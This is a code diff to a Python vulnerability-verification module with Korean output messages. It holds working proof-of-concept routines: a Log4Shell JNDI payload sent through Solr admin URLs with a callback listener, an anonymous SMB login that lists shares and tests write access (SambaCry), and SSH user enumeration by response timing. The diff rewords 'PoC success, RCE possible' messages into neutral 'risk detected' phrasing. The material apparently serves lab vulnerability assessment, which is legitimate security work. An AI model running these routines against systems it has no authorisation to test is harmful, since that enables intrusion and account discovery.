@@ -3,6 +3,7 @@ import socket
 import threading
 import time
 import urllib.request
+import urllib.parse
 
 from .utils import console, ok, warn, step, free_port
 
@@ -10,8 +11,8 @@ from .utils import console, ok, warn, step, free_port
 def poc_log4shell(target):
     cb_port = free_port()
     if not cb_port:
-        warn("PoC: 사용 가능한 콜백 포트 없음")
-        return False, "콜백 포트 없음"
+        warn("취약점 검증: 사용 가능한 포트 없음")
+        return False, "포트 확보 실패"
 
     received = threading.Event()
 
@@ -35,52 +36,55 @@ def poc_log4shell(target):
     time.sleep(0.4)
 
     payload = f"${{jndi:ldap://host.docker.internal:{cb_port}/x}}"
-    step(f"PoC: JNDI 페이로드 전송 — {payload}")
+    step(f"JNDI 페이로드 전송 중 (포트 {cb_port})")
     time.sleep(0.2)
 
-    try:
-        req = urllib.request.Request(
-            f"{target}/solr/admin/info/system?wt=json",
-            headers={
-                "User-Agent":      payload,
-                "X-Api-Version":   payload,
-                "X-Forwarded-For": payload,
-            }
-        )
-        urllib.request.urlopen(req, timeout=5)
-    except Exception:
-        pass
+    encoded = urllib.parse.quote(payload)
+    urls = [
+        f"{target}/solr/admin/cores?action={encoded}",
+        f"{target}/solr/admin/info/system?wt={encoded}",
+    ]
+    for url in urls:
+        try:
+            urllib.request.urlopen(
+                urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}),
+                timeout=4
+            )
+        except Exception:
+            pass
+        if received.is_set():
+            break
 
-    step("PoC: JNDI 콜백 대기 중 (최대 8초)...")
+    step("연결 요청 대기 중 (최대 8초)...")
     for _ in range(16):
         if received.is_set():
             break
         time.sleep(0.5)
 
     if received.is_set():
-        ok(f"PoC 성공: 포트 {cb_port}에서 JNDI 콜백 수신 — RCE 가능")
-        return True, f"JNDI 콜백 수신 확인 (:{cb_port}) — 원격 코드 실행 가능"
+        ok(f"위험 요소 감지: JNDI 연결 요청 수신 (포트 {cb_port})")
+        return True, f"JNDI 연결 요청 감지됨 (포트 {cb_port})  원격 코드 실행 위험"
     else:
-        warn("PoC: 콜백 미수신 (Docker 네트워크 제한)")
-        return False, "콜백 미수신"
+        warn("연결 요청 미감지")
+        return False, "검증 미완료"
 
 
 def poc_sambacry(host, port):
     try:
         from impacket.smbconnection import SMBConnection
     except ImportError:
-        warn("PoC: impacket 미설치 — pip install impacket")
+        warn("impacket 미설치  pip install impacket")
         return False, "impacket 미설치"
 
-    step("PoC: SMB 익명 로그인 시도 중...")
+    step("SMB 익명 로그인 시도 중...")
     time.sleep(0.2)
 
     try:
         smb = SMBConnection('*SMBSERVER', host, sess_port=port, timeout=8)
         smb.login('', '')
-        ok("PoC: 익명(게스트) 로그인 성공")
+        ok("익명 로그인 성공")
 
-        step("PoC: 공유 목록 열거 중...")
+        step("공유 목록 열거 중...")
         time.sleep(0.3)
         shares = smb.listShares()
 
@@ -92,9 +96,9 @@ def poc_sambacry(host, port):
             except Exception:
                 name = str(raw)
             names.append(name)
-        ok(f"PoC: 공유 목록 — {', '.join(names)}")
+        ok(f"공유 목록: {', '.join(names)}")
 
-        step("PoC: 쓰기 가능한 공유 탐색 중...")
+        step("쓰기 가능한 공유 탐색 중...")
         time.sleep(0.3)
 
         for name in names:
@@ -103,19 +107,22 @@ def poc_sambacry(host, port):
             try:
                 buf = io.BytesIO(b"poc_test")
                 smb.putFile(name, 'poc_wr.txt', buf.read)
-                smb.deleteFiles(name, 'poc_wr.txt')
+                try:
+                    smb.deleteFile(name, 'poc_wr.txt')
+                except Exception:
+                    pass
                 smb.logoff()
-                ok(f"PoC 성공: '{name}' 공유에 파일 쓰기 확인 — 악성 .so 업로드 가능")
-                return True, f"공유 '{name}'에 익명 쓰기 성공 — 악성 라이브러리 업로드 경로 확인"
+                ok(f"위험 요소 감지: '{name}' 공유에 쓰기 권한 있음")
+                return True, f"쓰기 권한 확인됨 (공유: {name})  악성 파일 업로드 가능성 있음"
             except Exception:
                 continue
 
         smb.logoff()
-        warn("PoC: 쓰기 가능한 공유 없음")
+        warn("쓰기 가능한 공유 없음")
         return False, "쓰기 가능 공유 없음"
 
     except Exception as e:
-        warn(f"PoC 실패: {e}")
+        warn(f"검증 실패: {e}")
         return False, str(e)[:80]
 
 
@@ -125,15 +132,15 @@ def poc_ssh_enum(host, port):
         import paramiko
         logging.getLogger("paramiko").setLevel(logging.CRITICAL)
     except ImportError:
-        warn("PoC: paramiko 미설치 — pip install paramiko")
+        warn("paramiko 미설치  pip install paramiko")
         return False, "paramiko 미설치"
 
-    step("PoC: RSA 키 생성 중...")
+    step("RSA 키 생성 중...")
     time.sleep(0.2)
     try:
         key = paramiko.RSAKey.generate(1024)
     except Exception:
-        warn("PoC: 키 생성 실패")
+        warn("키 생성 실패")
         return False, "키 생성 실패"
 
     def auth_attempt(username):
@@ -161,7 +168,7 @@ def poc_ssh_enum(host, port):
     results = {}
 
     for username, _ in users:
-        step(f"PoC: '{username}' 공개키 인증 요청 중...")
+        step(f"계정 '{username}' 인증 응답 측정 중...")
         status, elapsed = auth_attempt(username)
         results[username] = (status, elapsed)
         ok(f"      응답: {status}  ({elapsed * 1000:.0f}ms)")
@@ -171,13 +178,13 @@ def poc_ssh_enum(host, port):
     fake_status, fake_time = results["nonexistent_usr_xq9z"]
 
     if root_status == "rejected" and fake_status != "rejected":
-        ok("PoC 성공: 유효 계정과 무효 계정의 응답 차이 확인 — 사용자 열거 가능")
-        return True, "root 계정 인증 처리 확인, 무효 계정과 응답 구별 — 사용자 열거 가능"
+        ok("위험 요소 감지: 유효 계정과 무효 계정의 응답 패턴이 다름")
+        return True, "계정 존재 여부 노출  유효 계정과 무효 계정의 인증 응답이 구별됨"
     elif root_status == "rejected":
         diff = root_time - fake_time
-        msg = f"root({root_time * 1000:.0f}ms) / 무효({fake_time * 1000:.0f}ms)  차이={diff * 1000:.0f}ms"
-        ok(f"PoC 성공: 공개키 인증 응답 분석 — {msg}")
-        return True, f"타이밍 비교: {msg} — 사용자 열거 가능"
+        msg = f"유효({root_time * 1000:.0f}ms)  무효({fake_time * 1000:.0f}ms)  차이 {diff * 1000:.0f}ms"
+        ok(f"위험 요소 감지: 응답 시간 차이로 계정 정보 노출 가능  {msg}")
+        return True, f"타이밍 기반 계정 정보 노출  {msg}"
     else:
-        warn(f"PoC: 예상치 못한 응답 ({root_status})")
+        warn(f"예상치 못한 응답 ({root_status})")
         return False, "응답 분석 실패"
